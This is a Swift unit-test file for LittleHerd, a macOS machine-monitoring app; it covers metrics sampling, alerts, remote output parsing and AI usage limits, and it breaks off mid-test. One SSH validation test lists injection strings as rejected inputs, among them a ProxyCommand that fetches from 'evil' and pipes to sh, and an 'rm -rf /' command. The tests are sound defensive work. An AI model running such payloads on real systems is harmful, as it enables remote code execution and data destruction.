import Foundation
import Testing
@testable import LittleHerd

struct MetricsSamplerTests {
    @Test
    func snapshotContainsEveryMetric() async {
        let sampler = MetricsSampler()
        await sampler.prime()
        try? await Task.sleep(for: .milliseconds(100))

        let snapshot = await sampler.sample()

        #expect(snapshot.readings.count == MetricKind.allCases.count)
        #expect(snapshot.readings[.cpu] != nil)
        #expect(snapshot.readings[.memory]?.value != nil)
        #expect(snapshot.memoryPressure != nil)
        #expect(snapshot.readings[.network]?.value != nil)
        #expect(snapshot.readings[.disk]?.value != nil)
        #expect(!snapshot.storageVolumes.isEmpty)
    }

    @Test
    func percentageMetricsStayWithinBounds() async {
        let sampler = MetricsSampler()
        await sampler.prime()
        try? await Task.sleep(for: .milliseconds(100))

        let snapshot = await sampler.sample()

        for kind in [MetricKind.cpu, .gpu, .memory, .disk] {
            guard let value = snapshot.readings[kind]?.value else { continue }
            #expect((0 ... 100).contains(value))
        }
    }

    // Each projectName rule gets a case, so a rule that stops earning its keep
    // can be deleted without guessing what it did. The ordering case is the
    // important one: the rules are tried most-specific first and rearranging
    // them silently changes what a build is called.
    @Test
    func projectNameReadsAnAgentWorktree() {
        #expect(
            MachineActivityContext.projectName(
                fromWorkingDirectory: "/Users/t/local-code/little-herd/.claude/worktrees/feature"
            ) == "Little Herd"
        )
    }

    @Test
    func projectNameStripsTheDerivedDataHash() {
        #expect(
            MachineActivityContext.projectName(
                fromWorkingDirectory: "/Users/t/Library/Developer/Xcode/DerivedData/little-herd-ayuthjqlrvrwyeg/Build"
            ) == "Little Herd"
        )
    }

    @Test
    func projectNameReadsACheckoutThatBuildsIntoASibling() {
        #expect(
            MachineActivityContext.projectName(
                fromWorkingDirectory: "/Users/t/webkit/src/out/Debug"
            ) == "Webkit"
        )
    }

    @Test
    func swiftPackageBuildsWinOverAnEnclosingSourceDirectory() {
        // The rule order is load-bearing: "src" here is the developer's code
        // folder, not the project, so the .build rule has to be tried first.
        #expect(
            MachineActivityContext.projectName(
                fromWorkingDirectory: "/Users/t/src/myapp/.build/debug"
            ) == "Myapp"
        )
    }

    @Test
    func projectNameRecognisesAChromiumTree() {
        #expect(
            MachineActivityContext.projectName(
                fromWorkingDirectory: "/Users/t/chromium-checkout/src/third_party"
            ) == "Chromium"
        )
    }

    @Test
    func projectNameFallsBackPastBuildDirectories() {
        #expect(
            MachineActivityContext.projectName(
                fromWorkingDirectory: "/Users/t/code/my-tool/build"
            ) == "My Tool"
        )
        #expect(
            MachineActivityContext.projectName(fromWorkingDirectory: "/") == nil
        )
    }

    @Test
    func equalCPUActivitiesAreOrderedByName() {
        // Dictionary iteration is unordered and Swift's sort is not stable, so
        // without an explicit tiebreaker two processes reporting the same
        // percentage swap places between samples and the row flickers.
        let quiet = MachineActivity(processName: "node", cpuPercent: 2)
        let alsoQuiet = MachineActivity(processName: "chromium", cpuPercent: 2)
        let busy = MachineActivity(processName: "codex", cpuPercent: 9)

        #expect(MachineActivityParser.isOrderedByCPU(busy, quiet))
        #expect(!MachineActivityParser.isOrderedByCPU(quiet, busy))
        #expect(MachineActivityParser.isOrderedByCPU(alsoQuiet, quiet))
        #expect(!MachineActivityParser.isOrderedByCPU(quiet, alsoQuiet))
    }

    @Test
    func tiedHighlightsKeepAFixedOrder() {
        let output = """
        2.0 101 node
        2.0 102 chromium
        9.0 103 codex
        """
        let highlights = MachineActivityParser.highlights(
            from: output,
            limit: 3,
            minimumCPUPercent: 0
        )

        #expect(highlights.map(\.processName) == ["codex", "chromium", "node"])
    }

    @Test
    func onlyTheLocalMacOffersFilesystemActions() {
        // Revealing a remote machine's mount path would open whatever happens
        // to sit at that path on this Mac, or nothing.
        let local = MachineMonitorModel(configuration: .local())
        let remote = MachineMonitorModel(configuration: testMachineConfigurations[1])

        #expect(local.isLocal)
        #expect(!remote.isLocal)
    }

    @Test
    func alertsFireOnceOnTheWayInAndOnceOnTheWayOut() {
        var posted: [String] = []
        let center = MachineAlertCenter { title, _ in posted.append(title) }
        let machine = MachineMonitorModel(configuration: testMachineConfigurations[1])

        // Reachable, then gone.
        machine.apply(SystemSnapshot(timestamp: .now, readings: [:]))
        center.evaluate(machine, isEnabled: true)
        #expect(posted.isEmpty)

        // Down means down for a few samples running, not one dropped answer.
        for _ in 0 ..< MachineAlert.failuresBeforeUnreachable {
            machine.markOffline(.noAnswer)
            center.evaluate(machine, isEnabled: true)
        }
        #expect(posted.count == 1)

        // Still gone on the next sample: a monitor that repeats itself gets muted.
        machine.markOffline(.noAnswer)
        center.evaluate(machine, isEnabled: true)
        #expect(posted.count == 1)

        machine.apply(SystemSnapshot(timestamp: .now, readings: [:]))
        center.evaluate(machine, isEnabled: true)
        #expect(posted.count == 2)
        #expect(posted.last?.contains("back") == true)
    }

    @Test
    func aMachineThatNeverConnectedIsNotAnAlert() {
        var posted: [String] = []
        let center = MachineAlertCenter { title, _ in posted.append(title) }
        let machine = MachineMonitorModel(configuration: testMachineConfigurations[1])

        machine.markOffline(.nameNotFound)
        center.evaluate(machine, isEnabled: true)

        #expect(posted.isEmpty)
    }

    @Test
    func alertsStaySilentUntilEnabled() {
        var posted: [String] = []
        let center = MachineAlertCenter { title, _ in posted.append(title) }
        let machine = MachineMonitorModel(configuration: testMachineConfigurations[1])
        machine.apply(SystemSnapshot(timestamp: .now, readings: [:]))
        center.evaluate(machine, isEnabled: false)

        machine.markOffline(.noAnswer)
        center.evaluate(machine, isEnabled: false)

        #expect(posted.isEmpty)
    }

    @Test
    func machineCanBeRemovedFromTheHerd() throws {
        let storage = InMemoryConfigurationStorage()
        let store = MachineConfigurationStore(storage: storage)
        let remote = testMachineConfigurations[1]
        store.add([remote])
        #expect(store.machines.contains(remote))

        store.remove(remote.id)

        #expect(!store.machines.contains(remote))
        #expect(!MachineConfigurationStore(storage: storage).machines.contains(remote))
    }

    @Test
    func theLocalMacIsNeverRemoved() throws {
        let storage = InMemoryConfigurationStorage()
        let store = MachineConfigurationStore(storage: storage)
        let local = try #require(store.machines.first { $0.connection == .local })

        #expect(!store.canRemove(local.id))
        store.remove(local.id)

        #expect(store.machines.contains(local))
    }

    @Test
    func displayNamesComeFromTheConfigurationNotTheIdentifier() {
        // A machine discovered as "build-01" and then renamed must read as the
        // renamed value everywhere, not as a name derived from its id.
        let renamed = MachineConfiguration(
            id: MachineID("build-01"),
            name: "Build Server",
            shortName: "Build",
            hostname: "build-01.local",
            hardwareSummary: "Linux machine",
            platform: .linux,
            connection: .ssh,
            avatar: .oxGPU,
            identityFile: nil,
            serverNames: [],
            supportsGPU: false
        )
        let model = MonitorModel(configurations: [.local(), renamed])

        #expect(model.name(for: renamed.id) == "Build Server")
        #expect(model.shortName(for: renamed.id) == "Build")
        #expect(model.name(for: renamed.id) != renamed.id.displayName)
    }

    @Test
    func agentRowsCarryTheConfiguredMachineName() {
        let session = AgentSession(
            id: "codex:1",
            provider: .codex,
            projectName: "Little Herd",
            state: .active,
            updatedAt: .now,
            progress: nil
        )
        let row = MachineAgentSession(
            machine: MachineID("build-01"),
            session: session,
            machineName: "Build",
            machineSymbolName: "server.rack"
        )

        #expect(row.machineName == "Build")
        #expect(row.machineSymbolName == "server.rack")
    }

    @Test
    func snapshotIncludesProcessDerivedDetail() async {
        // Covers the path that shells out to `ps` off the actor's executor:
        // a regression there would leave the hover details silently empty.
        let sampler = MetricsSampler()
        let snapshot = await sampler.sample()

        #expect(!snapshot.memoryConsumers.isEmpty)
        #expect(snapshot.memoryConsumers.allSatisfy { $0.residentBytes > 0 })
    }

    @Test
    func sshHostNameAcceptsOrdinaryHosts() {
        for host in [
            "openclaw.local",
            "build-01",
            "malpern@mini.tail9d0bb8.ts.net",
            "192.168.1.24",
            "fe80::1%en0",
            "_underscored.host",
        ] {
            #expect(SSHHostName.isValid(host), "\(host) should be usable")
        }
    }

    @Test
    func sshHostNameRejectsHostsSSHWouldReadAsOptions() {
        // ssh parses any argument starting with "-" as an option, so a host
        // name like this one would otherwise run an arbitrary command.
        for host in [
            "-oProxyCommand=curl-http://evil/x|sh.local",
            "-J",
            "--",
            "",
            "host name with spaces",
            "host;rm -rf /",
            "host$(whoami)",
            "host`id`",
            "host\nsecond-line",
        ] {
            #expect(!SSHHostName.isValid(host), "\(host) should be refused")
        }
    }

    @Test
    func sshCommandRunnerRefusesAnOptionShapedHost() async {
        await #expect(throws: RemoteMonitorError.self) {
            try await SSHCommandRunner.run(
                host: "-oProxyCommand=echo injected",
                command: "true"
            )
        }
    }

    @Test
    func remoteOutputParserReadsKeyedCounters() {
        let output = """
        cpu=1 2 3 4
        mem=24000000000 8000000000
        network=1200 3400
        disk=100000 25000
        """

        let parsed = RemoteOutputParser.parse(output)

        #expect(parsed["cpu"] == [1, 2, 3, 4])
        #expect(parsed["mem"] == [24_000_000_000, 8_000_000_000])
        #expect(parsed["network"] == [1_200, 3_400])
        #expect(parsed["disk"] == [100_000, 25_000])
    }

    @Test
    func remoteOutputParserReadsStorageVolumes() throws {
        let rootName = Data("Root".utf8).base64EncodedString()
        let rootMount = Data("/".utf8).base64EncodedString()
        let archiveName = Data("Archive Drive".utf8).base64EncodedString()
        let archiveMount = Data("/mnt/archive".utf8).base64EncodedString()
        let output = """
        storage=\(rootName)\t\(rootMount)\t1000000\t250000
        storage=\(archiveName)\t\(archiveMount)\t4000000\t3000000
        """

        let volumes = RemoteOutputParser.parseStorageVolumes(output)
        let root = try #require(volumes.first)
        let archive = try #require(volumes.last)

        #expect(volumes.count == 2)
        #expect(root.name == "Root")
        #expect(root.mountPath == "/")
        #expect(root.usedPercent == 75)
        #expect(archive.name == "Archive Drive")
        #expect(archive.mountPath == "/mnt/archive")
        #expect(archive.usedPercent == 25)
    }

    @Test
    func memoryPressureEstimationUsesActionableThresholds() {
        #expect(
            MemoryPressureLevel.estimated(
                availableBytes: 3_000_000_000,
                totalBytes: 10_000_000_000
            ) == .normal
        )
        #expect(
            MemoryPressureLevel.estimated(
                availableBytes: 1_500_000_000,
                totalBytes: 10_000_000_000
            ) == .warning
        )
        #expect(
            MemoryPressureLevel.estimated(
                availableBytes: 500_000_000,
                totalBytes: 10_000_000_000
            ) == .critical
        )
    }

    @Test
    func processSamplesGroupHelpersIntoQuittableApplications() throws {
        let output = """
        10.0 100000 101 /Applications/Dia.app/Contents/MacOS/Dia
        2.0 50000 102 /Applications/Dia.app/Contents/Frameworks/Browser Helper.app/Contents/MacOS/Browser Helper
        1.0 75000 103 /Applications/Claude.app/Contents/MacOS/Claude
        3.0 90000 104 /System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer
        """

        let samples = ProcessSampleParser.parse(output)
        let consumers = MemoryConsumerAggregator.consumers(
            from: samples.map(\.memorySample)
        )
        let dia = try #require(consumers.first)

        #expect(samples.count == 4)
        #expect(dia.name == "Dia")
        #expect(dia.residentBytes == 150_000 * 1_024)
        #expect(consumers.map(\.name) == ["Dia", "Claude"])
    }

    @Test
    func remoteOutputParserReadsMemoryConsumers() throws {
        let figma = Data(
            "/Applications/Figma.app/Contents/MacOS/Figma".utf8
        ).base64EncodedString()
        let renderer = Data(
            "/Applications/Figma.app/Contents/Frameworks/Figma Helper.app/Contents/MacOS/Figma Helper".utf8
        ).base64EncodedString()
        let codex = Data("/usr/local/bin/codex".utf8).base64EncodedString()
        let output = """
        memory_process=\(figma)\t1000000000
        memory_process=\(renderer)\t500000000
        memory_process=\(codex)\t750000000
        """

        let consumers = RemoteOutputParser.parseMemoryConsumers(output)
        let figmaConsumer = try #require(consumers.first)

        #expect(figmaConsumer.name == "Figma")
        #expect(figmaConsumer.residentBytes == 1_500_000_000)
        #expect(consumers.last?.name == "Codex")
    }

    @Test
    func remoteOutputParserGroupsVolumesSharingAStorageContainer() throws {
        let rootName = Data("Macintosh HD".utf8).base64EncodedString()
        let rootMount = Data("/".utf8).base64EncodedString()
        let rootGroup = Data("disk3".utf8).base64EncodedString()
        let externalGroup = Data("disk5".utf8).base64EncodedString()
        let externalVolumes = [
            ("Foot Locker", "/Volumes/Foot Locker"),
            ("KeyPath Lab", "/Volumes/KeyPath Lab"),
            ("ChromiumWork", "/Volumes/ChromiumWork"),
        ]
        let externalLines = externalVolumes.map { name, mountPath in
            let encodedName = Data(name.utf8).base64EncodedString()
            let encodedMount = Data(mountPath.utf8).base64EncodedString()
            return "storage=\(encodedName)\t\(encodedMount)\t4000000000000\t3300000000000\t\(externalGroup)"
        }
        let output = ([
            "storage=\(rootName)\t\(rootMount)\t1000000000000\t200000000000\t\(rootGroup)",
        ] + externalLines).joined(separator: "\n")

        let volumes = RemoteOutputParser.parseStorageVolumes(output)
        let external = try #require(volumes.last)

        #expect(volumes.count == 2)
        #expect(volumes.first?.name == "Macintosh HD")
        #expect(external.name == "Foot Locker +2")
        #expect(external.id == "device:disk5")
        #expect(external.availableBytes == 3_300_000_000_000)
        #expect(external.mountPath.contains("ChromiumWork"))
    }

    @Test
    func remoteOutputParserCollapsesLinuxSubvolumeMounts() throws {
        let device = Data("/dev/mapper/root".utf8).base64EncodedString()
        let mounts = [
            ("Root", "/"),
            ("home", "/home"),
            ("log", "/var/log"),
            ("pkg", "/var/cache/pacman/pkg"),
        ]
        let output = mounts.map { name, mountPath in
            let encodedName = Data(name.utf8).base64EncodedString()
            let encodedMount = Data(mountPath.utf8).base64EncodedString()
            return "storage=\(encodedName)\t\(encodedMount)\t998037782528\t947118039040\t\(device)"
        }.joined(separator: "\n")

        let volumes = RemoteOutputParser.parseStorageVolumes(output)
        let root = try #require(volumes.first)

        #expect(volumes.count == 1)
        #expect(root.id == "device:/dev/mapper/root")
        #expect(root.name == "Root +3")
        #expect(root.usedPercent > 5)
        #expect(root.mountPath.contains("/home"))
    }

    @Test
    func remoteOutputParserReadsActivities() {
        let taskContext = Data(
            "/Users/example/local-code/little-herd".utf8
        ).base64EncodedString()
        let output = """
        cpu=1 2 3 4
        agent_task=codex\trecent\t1785505335824\t\(taskContext)
        activity=245.6 100 /opt/homebrew/bin/zellij
        child=100 ssh
        activity=54.4 101 zellij
        activity=185.4 202 ../../third_party/llvm-build/Release+Asserts/bin/clang++
        context=202 /Users/example/local-code/little-herd
        activity=12.1 303 /Applications/ChatGPT.app/Contents/Resources/codex
        activity=10.0 404 WindowServer
        """

        let activities = RemoteOutputParser.parseActivities(output)

        // Every distinct activity in the sample survives, ordered by CPU. The
        // old limit of three came from the hover strip's height; the machine
        // page shows a list, so the sampler keeps up to detailHighlights.
        #expect(activities.count == 4)
        #expect(activities[0].processName == "zellij")
        #expect(activities[0].cpuPercent == 300)
        #expect(activities[0].childProcessName == "ssh")
        #expect(String(localized: activities[0].shortLabel) == "Zellij · SSH session")
        #expect(activities[1].kind == .compiling)
        #expect(activities[1].processID == 202)
        #expect(activities[1].contextName == "Little Herd")
        #expect(activities[2].kind == .codex)
        #expect(activities[2].agentTask?.projectName == "Little Herd")
        #expect(activities[2].agentTask?.status == .recent)
        #expect(activities[2].agentTask?.updatedAt != nil)
        #expect(activities[3].kind == .desktop)
    }

    @Test
    func activitiesAreCappedAtTheDetailLimit() {
        let output = (1 ... 20)
            .map { "activity=\(Double(30 - $0)) \(100 + $0) process-\($0)" }
            .joined(separator: "\n")

        let activities = RemoteOutputParser.parseActivities(output)

        #expect(activities.count == MachineActivityParser.detailHighlights)
        #expect(activities.first?.processName == "process-1")
    }

    @Test
    func agentTaskParserDecodesProjectContext() throws {
        let projectContext = Data(
            "/Users/example/local-code/sample-app/.claude/worktrees/review-123".utf8
        ).base64EncodedString()
        let output = """
        agent_task=claude\trecent\t1785504896457\t\(projectContext)
        """

        let tasks = AgentTaskOutputParser.parse(output)
        let claude = try #require(tasks[.claude])

        #expect(claude.projectName == "Sample App")
        #expect(claude.status == .recent)
        #expect(claude.updatedAt != nil)
    }

    @Test
    func activeAgentTaskIsPrioritizedAheadOfHeavyCPUWork() {
        let task = AgentTaskSummary(
            provider: .codex,
            projectName: "Little Herd",
            status: .active,
            updatedAt: .now
        )
        let activities = [
            MachineActivity(processName: "WindowServer", cpuPercent: 60),
            MachineActivity(processName: "clang", cpuPercent: 50),
            MachineActivity(processName: "Safari", cpuPercent: 40),
        ]

        let selected = MachineActivityPrioritizer.select(
            from: activities,
            agentTasks: [.codex: task]
        )

        #expect(selected.count == 3)
        #expect(selected[0].kind == .codex)
        #expect(selected[0].agentTask?.projectName == "Little Herd")
        #expect(selected[0].cpuPercent == 0)
        #expect(selected[1].processName == "WindowServer")
        #expect(selected[2].processName == "clang")
    }

    @Test
    func activityParserFindsThreeBusiestDistinctActivities() {
        let output = """
         300.0 /bin/ps
          12.1 /Applications/ChatGPT.app/Contents/Resources/codex
         185.4 ../../third_party/llvm-build/Release+Asserts/bin/clang++
          94.6 /usr/bin/clang
          30.2 WindowServer
          21.3 /Applications/Safari.app/Contents/MacOS/Safari
           0.4 /usr/bin/nearly-idle
          0.0 /usr/bin/idle
        """

        let activities = MachineActivityParser.highlights(from: output)

        #expect(activities.count == 3)
        #expect(activities.map(\.processName) == ["clang++", "WindowServer", "Safari"])
        #expect(activities[0].cpuPercent == 280)
        #expect(activities[0].kind == .compiling)
        #expect(activities[1].kind == .desktop)
        #expect(activities[2].kind == .browser)
    }

    @Test
    func activityParserOmitsNearIdleProcesses() {
        let activities = MachineActivityParser.highlights(
            from: "0.4 /usr/bin/nearly-idle"
        )

        #expect(activities.isEmpty)
    }

    @Test
    func activityParserPreservesRepresentativeProcessID() {
        let activities = MachineActivityParser.highlights(
            from: """
            185.4 42 /usr/bin/clang++
             94.6 84 /usr/bin/clang
            """
        )

        #expect(activities.count == 1)
        #expect(activities[0].cpuPercent == 280)
        #expect(activities[0].processID == 42)
    }

    @Test(arguments: [
        (
            "/Users/example/local-code/chromium-work/src/out/AXSelection",
            "Chromium"
        ),
        ("/Users/example/local-code/little-herd", "Little Herd"),
        (
            "/Users/example/local-code/sample-app/.claude/worktrees/review-123",
            "Sample App"
        ),
        (
            "/Users/runner/chromium-build-lane/checkout/src",
            "Chromium"
        ),
        ("/Users/example/local-code/MyApp/.build/arm64-apple-macosx/debug", "MyApp"),
        (
            "/Users/example/Library/Developer/Xcode/DerivedData/SampleApp-abcdef123456/Build/Products/Debug",
            "SampleApp"
        ),
    ])
    func projectNameIsDerivedFromWorkingDirectory(path: String, expected: String) {
        #expect(
            MachineActivityContext.projectName(fromWorkingDirectory: path) == expected
        )
    }

    @Test
    func codexUsageParserChoosesTheLimitClosestToBlocking() throws {
        let data = try #require(
            """
            {
              "records": [{
                "snapshot": {
                  "primary": {
                    "usedPercent": 25,
                    "windowMinutes": 300,
                    "resetsAt": 807200000
                  },
                  "secondary": {
                    "usedPercent": 80,
                    "windowMinutes": 10080,
                    "resetsAt": 807700000
                  },
                  "tertiary": null,
                  "updatedAt": 807100000
                }
              }]
            }
            """.data(using: .utf8)
        )

        let limit = try #require(AIUsageLimitsParser.codexLimit(from: data))

        #expect(limit.provider == .codex)
        #expect(limit.remainingPercent == 20)
        #expect(limit.windowMinutes == 10_080)
    }

    @Test
    func claudeUsageParserPrefersTheShorterWindowOnATie() throws {
        let data = try #require(
            """
            {
              "five_hour": {
                "utilization": 0,
                "resets_at": "2026-07-31T10:00:00Z"
              },
              "seven_day": {"utilization": 0, "resets_at": null}
            }
            """.data(using: .utf8)
        )

        let limit = try #require(
            AIUsageLimitsParser.claudeLimit(from: data, updatedAt: .now)
        )

        #expect(limit.provider == .claude)
        #expect(limit.remainingPercent == 100)
        #expect(limit.windowMinutes == 300)
        #expect(limit.resetsAt != nil)
    }

    @Test
    func aiUsageBudgetStatusUsesEscalatingRemainingThresholds() {
        #expect(AIUsageBudgetStatus.status(for: 100) == .normal)
        #expect(AIUsageBudgetStatus.status(for: 26) == .normal)
        #expect(AIUsageBudgetStatus.status(for: 25) == .warning)
        #expect(AIUsageBudgetStatus.status(for: 10) == .critical)
        #expect(AIUsageBudgetStatus.status(for: 1.1) == .critical)
        #expect(AIUsageBudgetStatus.status(for: 1) == .urgent)
        #expect(AIUsageBudgetStatus.status(for: 0) == .urgent)
    }

    @Test
    func aiUsageProvidersOpenTheirOfficialUsageDashboards() {
        #expect(
            AIUsageProvider.codex.usageAndBillingURL.absoluteString
                == "https://chatgpt.com/codex/settings/usage"
        )
        #expect(
            AIUsageProvider.claude.usageAndBillingURL.absoluteString
                == "https://claude.ai/settings/usage"
        )
    }

    @Test
    func transferEventParserReadsMetadataOnlyHandoff() throws {
        let data = try #require(
            """
            {
              "id": "4F88A836-A708-4F22-9BE4-72657777EB25",
              "provider": "codex",
              "title": "Chromium AX review",
              "source": "macBookAir",
              "destination": "macMini",
              "cpuCores": 0.8,
              "status": "handingOff",
              "startedAt": "2026-07-31T05:42:15Z",
              "updatedAt": "2026-07-31T05:42:15Z"
            }
            """.data(using: .utf8)
        )

        let event = try #require(TaskTransferEventParser.parse(data))

        #expect(event.provider == .codex)
        #expect(event.source == .macBookAir)
        #expect(event.destination == .macMini)
        #expect(event.cpuCores == 0.8)
        #expect(event.status == .handingOff)
    }

    @Test
    func transferEventRejectsSameMachineMove() throws {
        let data = try #require(
            """
            {
              "id": "4F88A836-A708-4F22-9BE4-72657777EB25",
              "provider": "claude",
              "title": "Review the build",
              "source": "macMini",
              "destination": "macMini",
              "cpuCores": 1.2,
              "status": "handingOff",
              "startedAt": "2026-07-31T05:42:15Z",
              "updatedAt": "2026-07-31T05:42:15Z"
            }
            """.data(using: .utf8)
        )

        #expect(TaskTransferEventParser.parse(data) == nil)
    }

    @Test
    func overviewMetricCyclesThroughCPUAndMemoryAndDiskAndAI() {
        let model = MonitorModel()

        #expect(model.overviewMetric == .cpu)
        model.cycleOverviewMetric()
        #expect(model.overviewMetric == .memory)
        model.cycleOverviewMetric()
        #expect(model.overviewMetric == .disk)
        model.cycleOverviewMetric()
        #expect(model.overviewMetric == .ai)
        model.cycleOverviewMetric()
        #expect(model.overviewMetric == .cpu)
    }

    @Test
    func overviewMetricCircularNeighborsStayConsistent() {
        #expect(OverviewMetric.cpu.previous == .ai)
        #expect(OverviewMetric.cpu.next == .memory)
        #expect(OverviewMetric.memory.previous == .cpu)
        #expect(OverviewMetric.memory.next == .disk)
        #expect(OverviewMetric.disk.previous == .memory)
        #expect(OverviewMetric.disk.next == .ai)
        #expect(OverviewMetric.ai.previous == .disk)
        #expect(OverviewMetric.ai.next == .cpu)
    }

    @Test
    func synologyAppearsOnlyInDiskOverview() {
        let model = MonitorModel(configurations: testMachineConfigurations)

        #expect(model.machines.map(\.machine) == [.macBookAir, .macMini, .linux])
        model.showOverview(.disk)
        #expect(
            model.overviewMachines.map(\.machine)
                == [.macBookAir, .macMini, .linux, .synology]
        )
        model.showOverview(.cpu)
        #expect(model.overviewMachines.map(\.machine) == [.macBookAir, .macMini, .linux])
    }

    @Test
    @MainActor
    func machineConfigurationStorePersistsDynamicMachines() throws {
        let storage = InMemoryConfigurationStorage()
        let store = MachineConfigurationStore(storage: storage)
        let remote = testMachineConfigurations[1]
        store.add([remote])

        let reloaded = MachineConfigurationStore(storage: storage)
        #expect(reloaded.machines.contains(remote))
        #expect(reloaded.machines.first?.connection == .local)
    }

    @Test
    @MainActor
    func legacyPreferencesMigrateWithoutOverwritingNewValues() throws {
        // This one genuinely exercises UserDefaults: legacy migration reads and
        // writes preference domains directly.
        let temporary = TemporaryDefaults()
        let defaults = temporary.defaults
        defaults.set(true, forKey: LittleHerdPreferences.menuBarEnabledKey)
        let legacyMachines = try JSONEncoder().encode(
            [MachineConfiguration.local(computerName: "Legacy Mac")]
        )

        LittleHerdPreferences.migrateLegacySettingsIfNeeded(
            defaults: defaults,
            legacyDomain: [
                LittleHerdPreferences.menuBarEnabledKey: false,
                LittleHerdPreferences.machineConfigurationsKey: legacyMachines,
                LittleHerdPreferences.networkVolumeAccessOnboardingCompletedKey: true,
            ]
        )

        #expect(defaults.bool(forKey: LittleHerdPreferences.menuBarEnabledKey))
        #expect(
            defaults.data(forKey: LittleHerdPreferences.machineConfigurationsKey)
                == legacyMachines
        )
        #expect(
            defaults.bool(
                forKey: LittleHerdPreferences
                    .networkVolumeAccessOnboardingCompletedKey
            )
        )
    }

    @Test
    func agentSessionParserReadsStructuredProgressWithoutPromptText() throws {
        let id = Data("session-1".utf8).base64EncodedString()
        let path = Data("/Users/example/local-code/little-herd".utf8)
            .base64EncodedString()
        let step = Data("Verify the compact AI view".utf8).base64EncodedString()
        let output = "agent_session=codex\t\(id)\tactive\t1700000000000\t\(path)\t3\t4\t4\t\(step)"

        let session = try #require(AgentSessionOutputParser.parse(output).first)

        #expect(session.provider == .codex)
        #expect(session.projectName == "Little Herd")
        #expect(session.state == .active)
        #expect(session.progress?.completedStepCount == 3)
        #expect(session.progress?.totalStepCount == 4)
        #expect(session.progress?.currentStepIndex == 4)
        #expect(session.progress?.currentStep == "Verify the compact AI view")
        #expect(session.progress?.fractionCompleted == 0.75)
    }

    @Test
    func visibleAgentSessionsKeepAllActiveAndBoundRecentRows() {
        let now = Date(timeIntervalSinceReferenceDate: 10_000)
        let active = (0 ..< 3).map { index in
            MachineAgentSession(
                machine: .macBookAir,
                session: AgentSession(
                    id: "active-\(index)",
                    provider: .codex,
                    projectName: "Active \(index)",
                    state: .active,
                    updatedAt: now.addingTimeInterval(Double(index)),
                    progress: nil
                )
            )
        }
        let recent = (0 ..< 5).map { index in
            MachineAgentSession(
                machine: .macMini,
                session: AgentSession(
                    id: "recent-\(index)",
                    provider: .claude,
                    projectName: "Recent \(index)",
                    state: index == 0 ? .waiting : .completed,
                    updatedAt: now.addingTimeInterval(Double(-index)),
                    progress: nil
                )
            )
        }

        let visible = MachineAgentSessionBuilder.visibleSessions(
            from: active + recent,
            maximumRecentCount: 2
        )

        #expect(visible.count == 5)
        #expect(visible.filter { $0.session.state == .active }.count == 3)
        #expect(visible[3].session.state == .waiting)
    }

    @Test
    func memoryGrowthDetectorFlagsSustainedSubstantialGrowth() {
        var detector = MemoryGrowthDetector()
        let start = Date(timeIntervalSinceReferenceDate: 1_000)
        var annotated: [MemoryConsumer] = []

        for index in 0 ..< 10 {
            annotated = detector.annotate(
                consumers: [
                    MemoryConsumer(
                        name: "Growing App",
                        residentBytes: 1_000_000_000 + Double(index) * 32_000_000
                    ),
                ],
                at: start.addingTimeInterval(Double(index) * 10)
            )
        }

        let evidence = annotated.first?.growthEvidence
        #expect(evidence != nil)
        #expect(evidence?.sampleCount == 10)
        #expect(evidence?.risingIntervalCount == 9)
    }

    @Test
    func memoryGrowthDetectorIgnoresNormalFluctuation() {
        var detector = MemoryGrowthDetector()
        let start = Date(timeIntervalSinceReferenceDate: 2_000)
        let readings = [
            1_000_000_000.0,
            1_040_000_000.0,
            980_000_000.0,
            1_050_000_000.0,
            1_010_000_000.0,
            1_060_000_000.0,
            1_020_000_000.0,
            1_070_000_000.0,
            1_030_000_000.0,
            1_080_000_000.0,
        ]
        var annotated: [MemoryConsumer] = []

        for (index, reading) in readings.enumerated() {
            annotated = detector.annotate(
                consumers: [
                    MemoryConsumer(name: "Variable App", residentBytes: reading),
                ],
                at: start.addingTimeInterval(Double(index) * 10)
            )
        }

        #expect(annotated.first?.growthEvidence == nil)
    }

    @Test
    func menuBarPrioritizesCriticalMemoryPressure() {
        let headline = MenuBarStatusSelector.headline(for: [
            menuBarSnapshot(
                machine: .macBookAir,
                cpuPercent: 98,
                memoryPressure: .normal
            ),
            menuBarSnapshot(
                machine: .macMini,
                cpuPercent: 24,
                memoryPressure: .critical
            ),
            menuBarSnapshot(machine: .linux, state: .offline),
        ])

        #expect(headline == .memoryPressure(machine: .macMini, critical: true))
    }

    @Test
    func menuBarPrioritizesCriticalCPUOverCriticalDisk() {
        let headline = MenuBarStatusSelector.headline(for: [
            menuBarSnapshot(machine: .macBookAir, cpuPercent: 96),
            menuBarSnapshot(machine: .macMini, diskUsedPercent: 99),
            menuBarSnapshot(machine: .linux, state: .offline),
        ])

        #expect(
            headline == .highCPU(
                machine: .macBookAir,
                percent: 96,
                critical: true
            )
        )
    }

    @Test
    func menuBarReportsNearlyFullStorage() {
        let headline = MenuBarStatusSelector.headline(for: [
            menuBarSnapshot(machine: .macBookAir, cpuPercent: 20),
            menuBarSnapshot(machine: .macMini, cpuPercent: 30, diskUsedPercent: 92),
            menuBarSnapshot(machine: .linux, cpuPercent: 10),
        ])

        #expect(
            headline == .lowDisk(
                machine: .macMini,
                usedPercent: 92,
                critical: false
            )
        )
    }

    @Test
    func menuBarSurfacesUnavailableMachinesWhenResourcesAreSteady() {
        let headline = MenuBarStatusSelector.headline(for: [
            menuBarSnapshot(machine: .macBookAir, cpuPercent: 32),
            menuBarSnapshot(machine: .macMini, cpuPercent: 18),
            menuBarSnapshot(machine: .linux, state: .offline),
        ])

        #expect(headline == .unavailable(live: 2, total: 3))
    }

    @Test
    func menuBarNormalStateShowsTheBusiestMachine() {
        let headline = MenuBarStatusSelector.headline(for: [
            menuBarSnapshot(machine: .macBookAir, cpuPercent: 32.4),
            menuBarSnapshot(machine: .macMini, cpuPercent: 41.6),
            menuBarSnapshot(machine: .linux, cpuPercent: 8),
        ])

        #expect(
            headline == .normal(
                machine: .macMini,
                cpuPercent: 42,
                live: 3,
                total: 3
            )
        )
    }

    @Test
    @MainActor
    func addMachinesSelectsEveryReadyMachineByDefault() {
        let storage = InMemoryConfigurationStorage()
        let model = AddMachinesModel(
            store: testMachineStore(storage),
            machines: discoveredMachineSamples
        )

        #expect(model.selectedReadyCount == 3)
        #expect(model.deferredCount == 1)
        #expect(!model.selectedMachineIDs.contains("herd-nas.local"))
    }

    @Test
    @MainActor
    func addMachinesDoesNotSelectPermissionBlockedStorage() {
        let storage = InMemoryConfigurationStorage()
        let model = AddMachinesModel(
            store: testMachineStore(storage),
            machines: discoveredMachineSamples
        )

